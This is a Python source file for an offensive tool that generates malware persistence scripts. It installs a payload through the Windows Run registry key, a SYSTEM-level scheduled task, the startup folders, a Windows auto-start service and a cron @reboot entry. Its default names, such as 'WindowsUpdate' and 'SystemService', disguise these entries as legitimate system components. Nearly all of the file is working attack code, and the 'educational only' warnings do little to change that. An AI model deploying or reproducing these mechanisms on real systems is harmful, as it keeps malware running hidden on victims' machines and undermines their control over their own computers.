"""
Persistence Mechanisms for Payloads
WARNING: For authorized testing and educational purposes only.
"""
import os
import platform
import subprocess
from typing import Dict, Optional
import tempfile


class PersistenceMechanisms:
    """Various persistence mechanisms for payloads"""
    
    def __init__(self):
        self.system = platform.system()
    
    def create_registry_persistence(self, payload_path: str, 
                                   key_name: str = "WindowsUpdate") -> Dict:
        """Create Windows registry persistence"""
        if self.system != "Windows":
            return {"error": "Registry persistence only works on Windows"}
        
        code = f'''"""
Educational Registry Persistence - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import winreg
import os
import sys

payload_path = r"{payload_path}"
key_name = "{key_name}"

# Add to Run key
try:
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, payload_path)
    winreg.CloseKey(key)
    print("Registry persistence added successfully")
except Exception as e:
    print(f"Error: {{e}}")
    print("Run as administrator for system-wide persistence")
'''
        
        filepath = os.path.join(tempfile.gettempdir(), "registry_persistence.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "registry_persistence",
            "file": filepath,
            "payload": payload_path,
            "registry_key": f"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{key_name}",
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_scheduled_task(self, payload_path: str, 
                            task_name: str = "SystemUpdate") -> Dict:
        """Create Windows scheduled task persistence"""
        if self.system != "Windows":
            return {"error": "Scheduled tasks only work on Windows"}
        
        code = f'''"""
Educational Scheduled Task Persistence - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import subprocess

payload_path = r"{payload_path}"
task_name = "{task_name}"

# Create scheduled task (runs on startup)
command = [
    "schtasks",
    "/create",
    "/tn", task_name,
    "/tr", f"python {{payload_path}}",
    "/sc", "onstart",
    "/ru", "SYSTEM",
    "/f"
]

try:
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        print("Scheduled task created successfully")
    else:
        print(f"Error: {{result.stderr}}")
        print("Run as administrator")
except Exception as e:
    print(f"Error: {{e}}")
'''
        
        filepath = os.path.join(tempfile.gettempdir(), "scheduled_task.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "scheduled_task",
            "file": filepath,
            "payload": payload_path,
            "task_name": task_name,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
    
    def create_startup_folder(self, payload_path: str) -> Dict:
        """Create startup folder persistence"""
        startup_paths = {
            "Windows": os.path.join(os.getenv("APPDATA"), 
                                   "Microsoft", "Windows", "Start Menu", 
                                   "Programs", "Startup"),
            "Linux": os.path.expanduser("~/.config/autostart"),
            "Darwin": os.path.expanduser("~/Library/LaunchAgents")
        }
        
        startup_path = startup_paths.get(self.system)
        if not startup_path:
            return {"error": f"Startup folder not configured for {self.system}"}
        
        os.makedirs(startup_path, exist_ok=True)
        
        # Copy payload to startup
        payload_name = os.path.basename(payload_path)
        dest_path = os.path.join(startup_path, payload_name)
        
        try:
            import shutil
            shutil.copy2(payload_path, dest_path)
            
            return {
                "type": "startup_folder",
                "file": dest_path,
                "startup_path": startup_path,
                "warning": "Educational only. Use in isolated VM. Illegal without authorization."
            }
        except Exception as e:
            return {"error": f"Failed to copy to startup: {str(e)}"}
    
    def create_service_persistence(self, payload_path: str,
                                 service_name: str = "SystemService") -> Dict:
        """Create Windows service persistence"""
        if self.system != "Windows":
            return {"error": "Services only work on Windows"}
        
        code = f'''"""
Educational Service Persistence - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
Requires administrator privileges.
"""
import subprocess
import os

payload_path = r"{payload_path}"
service_name = "{service_name}"

# Create service using sc command
command = [
    "sc", "create", service_name,
    f"binPath= python {{payload_path}}",
    "start= auto",
    "DisplayName= System Service"
]

try:
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        # Start service
        subprocess.run(["sc", "start", service_name])
        print("Service created and started")
    else:
        print(f"Error: {{result.stderr}}")
        print("Run as administrator")
except Exception as e:
    print(f"Error: {{e}}")
'''
        
        filepath = os.path.join(tempfile.gettempdir(), "service_persistence.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "service",
            "file": filepath,
            "payload": payload_path,
            "service_name": service_name,
            "warning": "Educational only. Requires admin. Use in isolated VM. Illegal without authorization."
        }
    
    def create_cron_persistence(self, payload_path: str,
                               schedule: str = "@reboot") -> Dict:
        """Create Linux cron persistence"""
        if self.system not in ["Linux", "Darwin"]:
            return {"error": "Cron only works on Linux/macOS"}
        
        code = f'''"""
Educational Cron Persistence - FOR LEARNING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import subprocess
import os

payload_path = "{payload_path}"
schedule = "{schedule}"

# Add to crontab
cron_line = f"{{schedule}} python3 {{payload_path}}\\n"

try:
    # Get current crontab
    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
    current_cron = result.stdout if result.returncode == 0 else ""
    
    # Add new line
    new_cron = current_cron + cron_line
    
    # Write back
    process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
    process.communicate(input=new_cron)
    
    print("Cron job added successfully")
except Exception as e:
    print(f"Error: {{e}}")
'''
        
        filepath = os.path.join(tempfile.gettempdir(), "cron_persistence.py")
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            "type": "cron",
            "file": filepath,
            "payload": payload_path,
            "schedule": schedule,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
